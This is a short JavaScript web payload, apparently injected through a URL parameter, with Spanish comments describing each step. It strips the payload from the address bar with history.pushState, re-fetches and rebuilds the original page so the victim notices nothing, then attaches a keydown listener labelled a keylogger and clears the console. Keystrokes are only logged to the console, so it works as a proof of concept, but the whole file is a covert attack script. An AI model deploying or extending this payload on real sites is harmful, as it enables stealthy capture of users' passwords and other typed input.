document.addEventListener('DOMContentLoaded', function () {
  // Borramos el contenido para que parezca que sigue cargando
  document.body.innerHTML = '';
  // Esto cambia la URL que muestra el navegador, para que no se vea el payload
  var newUrl = window.location.href.split('?')[0];
  history.pushState({ path: newUrl }, '', newUrl);

  //Todo esto clona la web original
  fetch(newUrl)
    .then(response => { return response.text() })
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, "text/html");
      document.body.innerHTML = doc.body.innerHTML;
      document.head.innerHTML = doc.head.innerHTML;
    }).then(() => {
      //Finalmente agregamos el keylogger
      window.addEventListener("keydown", function (e) {
        console.log(e.key);
      });
      console.clear();
    })
    .catch();
});

